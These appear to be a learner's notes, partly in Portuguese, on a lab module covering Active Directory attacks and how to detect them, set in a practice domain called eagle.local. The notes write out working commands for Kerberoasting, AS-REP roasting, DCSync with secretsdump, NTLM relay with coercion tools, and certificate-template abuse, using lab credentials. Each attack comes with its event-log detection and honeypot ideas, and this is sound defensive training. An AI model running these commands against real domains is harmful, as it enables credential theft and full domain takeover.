...
```shellsession
Kl3gari@htb[/htb]$ xfreerdp /u:eagle\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution
```

![Terminal showing xfreerdp command to connect to 10.129.204.151 with certificate name mismatch warning. Prompt to trust certificate.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/Lab/RDPWindows.png)

If the connection is successful, a new window with WS001's desktop will appear on your screen, as shown below:

![File Explorer open on FreeRDP session to 10.129.204.151, showing Downloads folder with various scripts and executables.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/Lab/RDPWindows2.png)
...
```shellsession
Kl3gari@htb[/htb]$ ssh kali@TARGET_IP
```

![Terminal showing SSH connection to 10.129.204.150 with password 'kali' and host authenticity warning.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/Lab/SSHKali.png)
...
```shellsession
Kl3gari@htb[/htb]$ xfreerdp /v:TARGET_IP /u:kali /p:kali /dynamic-resolution
```
...
![File Explorer showing Downloads folder with 'Share' folder properties open, displaying network path \WS001\Share.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/Lab/share1.png)
...
```shellsession
Kl3gari@htb[/htb]$ smbclient \\\\TARGET_IP\\Share -U eagle/administrator%Slavi123
```

![Terminal showing smbclient command to connect to \172.16.18.25\Share with user eagle/administrator and password Slavi123.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/Lab/share2.png)
...
![PowerShell running Rubeus.exe kerberoast command, extracting Kerberoastable tickets for two users, Administrator and webservice, saved in spn.txt.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A1/Roast-hashes1.png)
...
```shellsession
Kl3gari@htb[/htb]$ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
...
![Terminal showing hashcat command to crack hashes from spn.txt using passwords.txt, outputting results to cracked.txt.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A1/Roast-hashes3.png)
...
```shellsession
Kl3gari@htb[/htb]$ cat cracked.txt
...
![Terminal showing contents of cracked.txt with password Slavi123 revealed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A1/Roast-hashes2.png)
...
![Event 4769: Kerberos ticket request by bob@EAGLE.LOCAL for Administrator service from IP 172.16.18.25, using RC4 encryption.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A1/Detect1.png)
...
![Security log showing two 'Audit Success' events for Kerberos Service Ticket with Event ID 4769 at 9:11:08 PM on 12/12/2022. Account: bob@EAGLE.LOCALl, IP: 172.16.18.25, Port: 60491. Highlighted note: 'Matching volume of events by source IP address or requester name within a short time.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A1/Detect2.png)
...
![Security log Event 4769: Kerberos service ticket requested by bob@EAGLE.LOCAL, Service Name: svc-iam, IP: 172.16.18.25, Port: 60513. Alert: Honeypot triggered.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A1/honeypot1.png)
...
RDP to 10.129.46.213 (ACADEMY-WINATTKDEF-KALI),10.129.239.82 (ACADEMY-WINATTKDEF-WS01), with user "bob" and password "Slavi123" 
...
> **Fazer funcionar e gerar o evento pelo kali:** impacket-GetUserSPNs "eagle.local/htb-student":'HTB_@cademy_stdnt!' -dc-ip 172.16.18.3 -request
>
> **Comando Powershell:** Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} | ? { $_.Properties[2].Value -like '\*webservice\*' } | select -First 1 | format-list *
>
...
```shellsession
        shellsession
Kl3gari@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
...
```shellsession
Kl3gari@htb[/htb]$ sudo cat asrepcrack.txt
...
> **Fazer funcionar e gerar o evento pelo kali:**  impacket-GetNPUsers "eagle.local/htb-student":'HTB_@cademy_stdnt!' -dc-ip 172.16.18.3 -request
>
> **Comando Powershell:** Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4768} | ? { $\_.Properties[0].Value -like '\*svc-iam\*'
> } | select -First 1 | Select-Object @{Name="User";Expression={$\_.Properties[0].Value}}, @{Name="Doamin";Expression={$\_.Properties[1].Value}}, @{Name="ServiceSid";Expression={$_.Properties[2].Value}}
>
...
> **Comando Powershell:** Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663} -MaxEvents 9 | format-list * | findstr "Access Mask"
>
> **Answer:** 0x80
...
![PowerShell command Invoke-ShareFinder lists network shares on eagle.local, including \Server01.eagle.local\dev$.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/sharescan.png)
...
![Network folder Server01.eagle.local in Explorer is empty.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/sharefileless.png)
...
![Network folder Server01.eagle.local\dev$ showing folders 1 to 5 and setup.ini file.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/sharecontent.png)
...
![PowerShell findstr command searches for 'pass' in .bat, .cmd, .ini, and .config files, matching setup.ini and web.config.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/scan1.png)
...
![PowerShell command output showing a search for '.config' files containing 'pw'. The result includes a file path and a line with 'pw' followed by 'BANANANANANANANANANANANANANANANANANAS'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/scan2.png)
...
![PowerShell command output showing a search for '.ps1' scripts containing 'eagle'. The result includes a file path and commands to map network drives with credentials.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/scan3.png)
...
![Security event log 4624 showing a successful logon by 'Administrator' from IP 172.16.18.20, highlighting user and source correlation for abnormal activity.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/Detect4624.png)

Similarly, if Kerberos were used for authentication, event ID `4768` would be generated:

![Security event log 4768 showing a Kerberos ticket request by 'Administrator' from IP ::ffff:172.16.18.25, highlighting user and source correlation for abnormal activity.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/Detect4768.png)
...
This attack provides another excellent reason for leaving a honeypot user in AD  environments: a semi-privileged username with a `wrong` password. An adversary eventually can detect the honeypot account if  the password was changed after the file’s last modification date. Below is a good setup for the account:
...
![Security event log 4625 showing a failed logon attempt for 'svc-iis' from IP 172.16.18.20 due to a bad password, indicating potential attacker activity.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/honeypot4dot3.png)

- `4771`

![Security event log 4771 showing failed Kerberos pre-authentication for 'svc-iis' from IP ::ffff:172.16.18.4, with failure code 0x18 indicating a wrong password.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/honeypot4.png)

- `4776`

![Security event log 4776 showing a credential validation attempt for 'svc-iis' with error code 0xC000006A indicating a bad password.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/honeypot4dot2.png)
...
> **Fazer pelo kali:** smbclient \\\\172.16.18.10\\'dev$' -U eagle/bob%Slavi123
> Try "help" to get a list of possible commands.
> smb: \> prompt off
> smb: \> recurse on
> smb: \> mget *
> getting file \setup.ini of size 45 as setup.ini (43.9 KiloBytes/sec) (average 43.9 KiloBytes/sec)
> getting file \4\5\4\web.config of size 147 as 4/5/4/web.config (28.7 KiloBytes/sec) (average 31.2 KiloBytes/sec)
> getting file \5\2\3\microsoft.config of size 98 as 5/2/3/microsoft.config (23.9 KiloBytes/sec) (average 28.3 KiloBytes/sec)
> getting file \2\4\4\Software\connect.ps1 of size 102 as 2/4/4/Software/connect.ps1 (19.9 KiloBytes/sec) (average 25.5 KiloBytes/sec)
> getting file \2\4\4\Software\connect2.ps1 of size 105 as 2/4/4/Software/connect2.ps1 (34.2 KiloBytes/sec) (average 27.0 KiloBytes/sec)
> smb: \> exit
>
> grep -iaR 'admin' *
> 2/4/4/Software/connect.ps1:net use Z: \\server1\administrators
> 2/4/4/Software/connect.ps1:net use E: \\DC1\sharedScripts /user:eagle\Administrator Slavi123
> 2/4/4/Software/connect2.ps1:net use Z: \\server1\administrators
...
![Properties window showing user 'Rocky Balboa' with permissions for 'Replicating Directory Changes' and 'Replicating Directory Changes All' allowed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/DCPermission.png)
...
![Command prompt showing 'runas' command to execute 'cmd.exe' as user 'eagle\rocky', with a new prompt running as 'rocky'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/Rockyprompt.png)
...
![Command output from mimikatz showing DCSync operation for 'Administrator' on domain 'eagle.local', displaying NTLM hash.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/AdminHash.png)
...
![Security event log 4662 showing object access by 'rocky' on domain 'eagle.local', with control access properties listed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/DetectDCSync.png)
...
> **Fazer pelo kali:** impacket-secretsdump 'eagle.local/rocky':'Slavi123'@172.16.18.3 -just-dc -just-dc-user Administrator
>
...
> **Comando Powershell:** Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662} -MaxEvents 1 | format-list * | findstr "TaskDisplayName"
>
...
![Command output from mimikatz showing DCSync operation for 'krbtgt' on domain 'eagle.local', displaying NTLM hash.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A8/krbtgt.png)
...
![PowerShell command output showing execution of 'Get-DomainSID' to retrieve domain SID 'S-1-5-21-1518138621-4282902758-752445584'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A8/sid.png)
...
![Command output from mimikatz showing a golden ticket for 'Administrator' on domain 'eagle.local' successfully generated and submitted in the current session.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A8/kerbTicket.png)
...
![Command output from mimikatz showing cached Kerberos ticket for 'Administrator' on domain 'eagle.local' with encryption type RSADSI RC4-HMAC.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A8/injectedTicket.png)
...
![Command prompt showing directory listing of '\dc1\c$' with five directories: PerfLogs, Program Files, Program Files (x86), Users, and Windows.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A8/listDC1.png)
...
![Security event log 4624 showing successful logon for 'Administrator' on domain 'eagle.local' from IP 172.16.18.25, indicating normal appearance despite potential Golden Ticket use.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A8/logonAfterTickets.png)
...
![Security event log 4769 showing a Kerberos service ticket request for 'Administrator@eagle.local' from IP ::ffff:172.16.18.25, used to detect abnormal behavior.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A8/ticket1.png)

### Ticket 2:

![Security event log 4769 showing a Kerberos service ticket request for 'Administrator@eagle.local' from IP ::ffff:172.16.18.25, used to detect abnormal behavior.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A8/ticket2.png)
...
> **Fazer pelo kali:** impacket-secretsdump 'eagle.local/rocky':'Slavi123'@172.16.18.3 -just-dc -just-dc-user krbtgt
>
...
![PowerShell command output showing 'Get-NetUser -TrustedToAuth' for 'web service' user, highlighting delegation to 'DC1' on HTTP service.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A9/ConsDelegation.png)
...
![Rubeus.exe command output showing password hash calculation for 'Slavi123', resulting in RC4_HMAC hash 'FCDC65703DD2B0D789977F1F3EEAECF'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A9/phash.png)
...
![Rubeus.exe command for S4U with TGT request successful, generating ticket for Administrator using RC4_HMAC hash.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A9/getTicket.png)
...
![Klist command output showing cached ticket for Administrator at EAGLE.LOCAL with AES-256 encryption.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A9/klistdelegated.png)
...
![PowerShell session showing 'Enter-PSSession dc1', hostname 'DC1', and user 'eagle\administrator'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A9/pssession.png)
...
![Event 4624 showing Administrator login from IP 172.16.18.25, with transited services as webservice@EAGLE.LOCAL.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A9/detect1.png)
...
```shellsession
        shellsession
Kl3gari@htb[/htb]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
...
![Impacket-ntlmrelayx command targeting dcsync://172.16.18.4 with SMB2 support, servers started and waiting for connections.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A10/startntlmrelayx.png)
...
![Python dementor.py command targeting IPs 172.16.18.20 and 172.16.18.3 with user 'bob', domain 'eagle.local', and password 'Slavi123', resulting in network address error.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A10/dementor.png)

Now, switching back to the terminal session with `NTLMRelayx`, we will see that DCSync was successful:

![Impacket tool output showing connection from 172.16.18.3 to dcsync://172.16.18.4, dumping domain credentials and Kerberos keys.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A10/hashes.png)
...
![Registry Editor showing 'RegisterSpoolerRemoteRpcEndPoint' set to 1 under HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A10/registry.png)
...
![Event 4624 showing DC1$ account login from IP 172.16.18.20, indicating a relayed connection.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A10/detectDCSync.png)
...
![PowerShell command 'Get-NetComputer -Unconstrained' lists samaccontnames: DC1$, SERVER01$, WS001$, DC2$](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A11/GetNetComputer.png)
...
![Rubeus.exe monitoring TGTs every second, found new TGT for user bob@EAGLE.LOCAL with start time 18/12/2022 23:30:09 and end time 19/12/2022 09:30:09.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A11/RubeusMonitor.png)
...
```shellsession
        shellsession
Kl3gari@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
...
![Coercer tool analyzing protocols on dc1.eagle.local, performing RPC calls to coerce authentication to ws001.eagle.local, with accessible pipes and errors noted.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A11/Coercer.png)
...
![Rubeus output showing new TGT for user DC1$@EAGLE.LOCAL, start time 18/12/2022 23:30:21, end time 19/12/2022 09:30:21, with Base64 encoded ticket.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A11/DCTGT.png)
...
![Notepad showing firewall log with TCP connections allowing inbound requests to port 445 and outbound connections to port 445.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A11/Coercer-FirewallLogs.png)
...
![Firewall log showing allowed TCP traffic to port 445 and a dropped outbound connection from 192.168.28.200 to 192.168.28.128.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A11/Coercer-FirewallLogsBlockOutbound139n445.png)
...
![Command prompt showing SharpHound execution with collection methods and status updates. Enumeration completed successfully on 19/12/2022.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A12/Sharphound.png)
...
![Diagram showing Bob with GenericAll permissions over Anni and Server01.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A12/bloodhound.png)
...
![Event 4738: Bob modified Anni's account with no details of changes.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A12/detect1.png)
...
![Event 4742: Bob modified Server01 with no details of changes.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A12/detect2.png)
...
![Vulnerable certificate template details: UserCert, valid for 10 years, used for client authentication, with enrollment rights for Domain Admins and Users.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/certifyRequest.png)
...
![Certify.exe request: Bob requests a certificate as Administrator; certificate issued.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/requestCert.png)
...
```shellsession
        shellsession
Kl3gari@htb[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![OpenSSL command to export cert.pem to cert.pfx with password prompt.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/convertPEM.png)
...
![Rubeus command requests TGT for Administrator using cert.pfx; ticket successfully imported.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/certLogin.png)
...
![Command prompt showing directory listing of \dc1\c$ with folders like DFSReports and Mimikatz.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/dirDC1.png)
...
![Events 4886 and 4887: Bob requested and received a certificate; no SAN details provided.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/eventBob.png)
...
![Certificate request by EAGLE\bob for UserCert, effective 10/16/2022, expires 10/16/2024.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/detectCert1.png)
...
![Certificate details showing Subject Alternative Name as Principal Name=Administrator.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/detectCert2.png)
...
![Certificate request by Bob for Administrator using UserCert template from WS001.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/certpieces.png)
...
![Event 4768: Administrator requested Kerberos TGT from IP 172.16.18.25; certificate details included.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A13/detect1.png)
...
```shellsession
        shellsession
Kl3gari@htb[/htb]$ impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs
...
![Impacket ntlmrelayx command relays to 172.16.18.15 using DomainController template with SMB2 and ADCS support.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/ntlmrelaystart.png)
...
```shellsession
        shellsession
Kl3gari@htb[/htb]$ python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
...
![Python script dementor.py connects to 172.16.18.4 with user Bob; network address invalid error](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/dementor.png)
...
![Connection from 172.16.18.4 to 172.16.18.15; certificate ID 48 issued for DC2.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/DC2Cert.png)
...
![Rubeus.exe asktgt command for user DC2$ with certificate.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/RubeusCert1.png)

![TGT request successful for DC2 using certificate; ticket imported.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/RubeusCert2.png)
...
![Mimikatz command executed for DCsync on Administrator; NTLM hash obtained successfully.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/mimikatz.png)
...
![Event 4886: Certificate request by EAGLE\user using DomainController template.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/d1.png)

![Event 4887: Certificate request approved for EAGLE\user using DomainController template.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/d2.png)
...
![Event 4768: TGT requested for user from IP 172.16.18.25 using certificate.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/d4.png)
...
![Event 4624: Successful login for user from IP 172.16.18.25.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A14/d3.png)
